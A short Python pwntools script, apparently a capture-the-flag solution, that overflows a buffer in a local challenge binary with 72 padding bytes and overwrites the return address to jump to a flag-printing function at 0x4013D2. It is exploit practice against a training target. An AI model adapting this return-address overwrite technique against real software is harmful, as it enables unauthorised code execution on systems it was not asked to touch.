#!/usr/bin/env python3
from pwn import *

exe = ELF('./chall') 
context.update(arch='amd64', os='linux', log_level='debug', binary=exe)

p = process(exe.path)   

cat_flag_cmd = 0x4013D2

payload = b'a' * 72 + p64(cat_flag_cmd)

p.sendlineafter(b'choice: ', b'1')
p.sendlineafter(b'coordinates: ', payload)

p.interactive()